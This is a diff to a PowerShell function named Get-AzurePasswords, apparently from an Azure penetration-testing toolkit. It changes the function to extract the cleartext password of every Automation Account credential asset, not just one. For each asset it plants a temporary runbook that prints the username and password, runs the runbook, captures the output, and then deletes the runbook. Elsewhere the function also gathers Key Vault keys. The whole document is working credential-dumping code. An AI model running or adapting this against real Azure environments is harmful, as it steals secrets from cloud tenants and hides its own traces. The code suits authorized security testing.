@@ -150,7 +150,7 @@ Function Get-AzurePasswords
                     # Add Key to the table
                     $TempTblCreds.Rows.Add("Key",$keyValue.Name,"N/A",$keyValue.Key,"N/A",$keyValue.Created,$keyValue.Updated,$keyValue.Enabled,"N/A",$vault.VaultName,$subName) | Out-Null
 
-                    }
+                }
             }
             catch{Write-Verbose "`t`tUnable to access the keys for the $vaultName key vault"}
             
@@ -238,7 +238,6 @@ Function Get-AzurePasswords
 
             # Set Random names for the runbooks. Prevents conflict issues
             $jobName = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})
-            $jobName2 = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})
                                 
             # Set the runbook to export the runas certificate and write Script to local file
             "`$RunAsCert = Get-AutomationCertificate -Name 'AzureRunAsCertificate'" | Out-File -FilePath "$pwd\$jobName.ps1" 
@@ -271,12 +270,19 @@ Function Get-AzurePasswords
                 
             # If other creds are available, get the credentials from the runbook
             if ($autoCred -ne $null){
-                # Write Script to local file
-                "`$myCredential = Get-AutomationPSCredential -Name '$autoCred'" | Out-File -FilePath "$pwd\$jobName2.ps1" 
-                "`$userName = `$myCredential.UserName" | Out-File -FilePath "$pwd\$jobName.ps1" -Append
-                "`$password = `$myCredential.GetNetworkCredential().Password" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
-                "write-output `$userName" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
-                "write-output `$password"| Out-File -FilePath "$pwd\$jobName2.ps1" -Append
+                # foreach credential in autocred, create a new file, add the name to the list
+                foreach ($subCred in $autoCred){
+                    # Set Random names for the runbooks. Prevents conflict issues
+                    $jobName2 = -join ((65..90) + (97..122) | Get-Random -Count 15 | % {[char]$_})
+
+                    # Write Script to local file
+                    "`$myCredential = Get-AutomationPSCredential -Name '$subCred'" | Out-File -FilePath "$pwd\$jobName2.ps1" 
+                    "`$userName = `$myCredential.UserName" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
+                    "`$password = `$myCredential.GetNetworkCredential().Password" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
+                    "write-output `$userName" | Out-File -FilePath "$pwd\$jobName2.ps1" -Append
+                    "write-output `$password"| Out-File -FilePath "$pwd\$jobName2.ps1" -Append
+                    $jobList += @($jobName2)
+                }
             }                               
 
             # If the runbook didn't write, don't run it
@@ -316,59 +322,63 @@ Function Get-AzurePasswords
             }
             
             # If there's cleartext credentials, run the second runbook
-            if ($autoCred -ne $null){            
-                # If the runbook2 didn't write, don't run it
-                if (Test-Path $pwd\$jobName2.ps1 -PathType Leaf){
-                
-                    Write-Verbose "`tGetting cleartext credentials for $verboseName using the $jobName2.ps1 Runbook"
-
-                    try{
-                        Import-AzureRmAutomationRunbook -Path $pwd\$jobName2.ps1 -ResourceGroup $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Type PowerShell -Name $jobName2 | Out-Null
-
-                        # publish the runbook
-                        Publish-AzureRmAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroup $AutoAccount.ResourceGroupName -Name $jobName2 | Out-Null
-
-                        # run the runbook and get the job id
-                        $jobID = Start-AzureRmAutomationRunbook -Name $jobName2 -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName | select JobId
-
-                        $jobstatus = Get-AzureRmAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
-
-                        # Wait for the job to complete
-                        Write-Verbose "`t`tWaiting for the automation job to complete"
-                        while($jobstatus.Status -ne "Completed"){
-                            $jobstatus = Get-AzureRmAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
-                        }    
-
-                        # If there was an actual cred here, get the output and add it to the table                    
+            if ($autoCred -ne $null){
+                $autoCredIter = 0   
+                Write-Verbose "`tGetting cleartext credentials for the $verboseName Automation Account"
+                foreach ($jobToRun in $jobList){
+                    # If the additional runbooks didn't write, don't run them
+                    if (Test-Path $pwd\$jobToRun.ps1 -PathType Leaf){
+                        $autoCredCurrent = $autoCred[$autoCredIter]
+                        Write-Verbose "`t`tGetting cleartext credentials for $autoCredCurrent using the $jobToRun.ps1 Runbook"
+                        $autoCredIter++
                         try{
-                            # Get the output
-                            $jobOutput = (Get-AzureRmAutomationJobOutput -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Id $jobID.JobId | select Summary).Summary
+                            Import-AzureRmAutomationRunbook -Path $pwd\$jobToRun.ps1 -ResourceGroup $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Type PowerShell -Name $jobToRun | Out-Null
 
-                            if($jobOutput[0] -like "Credentials asset not found*"){$jobOutput[0] = "Not Created"; $jobOutput[1] = "Not Created"}
+                            # publish the runbook
+                            Publish-AzureRmAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroup $AutoAccount.ResourceGroupName -Name $jobToRun | Out-Null
+
+                            # run the runbook and get the job id
+                            $jobID = Start-AzureRmAutomationRunbook -Name $jobToRun -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName | select JobId
+
+                            $jobstatus = Get-AzureRmAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
+
+                            # Wait for the job to complete
+                            Write-Verbose "`t`t`tWaiting for the automation job to complete"
+                            while($jobstatus.Status -ne "Completed"){
+                                $jobstatus = Get-AzureRmAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
+                            }    
+
+                            # If there was an actual cred here, get the output and add it to the table                    
+                            try{
+                                # Get the output
+                                $jobOutput = (Get-AzureRmAutomationJobOutput -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Id $jobID.JobId | select Summary).Summary
+                                
+                                if($jobOutput[0] -like "Credentials asset not found*"){$jobOutput[0] = "Not Created"; $jobOutput[1] = "Not Created"}
         
-                            #write to the table
-                            $TempTblCreds.Rows.Add("AzureAutomation Account",$AutoAccount.AutomationAccountName,$jobOutput[0],$jobOutput[1],"N/A","N/A","N/A","N/A","Password","N/A",$subName) | Out-Null
+                                #write to the table
+                                $TempTblCreds.Rows.Add("AzureAutomation Account",$AutoAccount.AutomationAccountName,$jobOutput[0],$jobOutput[1],"N/A","N/A","N/A","N/A","Password","N/A",$subName) | Out-Null
+                            }
+                            catch {}
+
+                            # clean up
+                            Write-Verbose "`t`tRemoving $jobToRun runbook from $verboseName Automation Account"
+                            Remove-AzureRmAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -Name $jobToRun -ResourceGroupName $AutoAccount.ResourceGroupName -Force
                         }
-                        catch {}
+                        Catch{Write-Verbose "`tUser does not have permissions to import Runbook"}
 
-                        # clean up
-                        Write-Verbose "`t`tRemoving $jobName2 runbook from $verboseName Automation Account"
-                        Remove-AzureRmAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -Name $jobName2 -ResourceGroupName $AutoAccount.ResourceGroupName -Force
+                        # Clean up local temp files
+                        Remove-Item $pwd\$jobToRun.ps1 | Out-Null
                     }
-                    Catch{Write-Verbose "`tUser does not have permissions to import Runbook"}
                 }
-
             }
-
             # Clean up local temp files
             Remove-Item $pwd\$jobName.ps1 | Out-Null
-            if ($autoCred -ne $null){Remove-Item $pwd\$jobName2.ps1 | Out-Null}
         }
     }
     Write-Verbose "Password Dumping Activities Have Completed"
 
     # Output Creds
-    $TempTblCreds
+    Write-Output $TempTblCreds
 }
 
 
